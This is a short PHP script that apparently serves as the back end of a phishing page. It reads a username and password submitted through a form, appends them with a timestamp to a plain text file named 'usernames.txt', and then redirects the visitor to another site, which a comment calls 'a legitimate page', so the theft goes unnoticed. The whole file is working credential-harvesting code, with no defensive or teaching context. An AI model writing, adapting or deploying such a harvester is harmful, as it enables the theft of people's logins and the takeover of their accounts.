<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$entry = "Generic | Username: " . $username . " | Pass: " . $password . " | Time: " . date('Y-m-d H:i:s') . "\n";
file_put_contents("usernames.txt", $entry, FILE_APPEND);

// Redirect to a legitimate page
header('Location: https://example.com');
exit();
?>